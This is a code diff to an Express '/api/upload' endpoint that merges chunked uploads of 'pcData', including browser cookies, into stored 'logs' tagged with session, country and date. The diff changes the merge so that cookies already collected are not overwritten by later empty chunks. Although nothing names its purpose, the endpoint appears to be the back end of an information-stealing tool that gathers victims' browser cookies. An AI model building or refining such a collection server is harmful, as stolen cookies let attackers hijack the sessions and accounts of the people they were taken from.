@@ -344,6 +344,18 @@ app.post('/api/upload', (req, res) => {
             cookies: transformedBrowserCookies.length || 0
         };
 
+        // Only include browserCookies in pcData if we actually have cookies in this chunk
+        // This prevents overwriting existing cookies with empty arrays from later chunks
+        const pcDataToStore = { ...pcData };
+        if (transformedBrowserCookies.length > 0 || (pcData.browserCookies && typeof pcData.browserCookies === 'string' && pcData.browserCookies.length > 0)) {
+            // Only update browserCookies if this chunk has actual cookie data
+            pcDataToStore.browserCookies = transformedBrowserCookies.length > 0 ? transformedBrowserCookies : pcData.browserCookies;
+        } else if (!pcData.browserCookies) {
+            // If this chunk doesn't have browserCookies at all, don't include it
+            // This allows the merge logic to preserve existing cookies
+            delete pcDataToStore.browserCookies;
+        }
+        
         const logData = {
             id: logId,
             sessionId: sessionId,
@@ -351,10 +363,7 @@ app.post('/api/upload', (req, res) => {
             country: country,
             date: dateTime,
             dataSummary,
-            pcData: {
-                ...pcData,
-                browserCookies: transformedBrowserCookies,
-            },
+            pcData: pcDataToStore,
         };
 
         // Use createOrUpdate to merge chunks
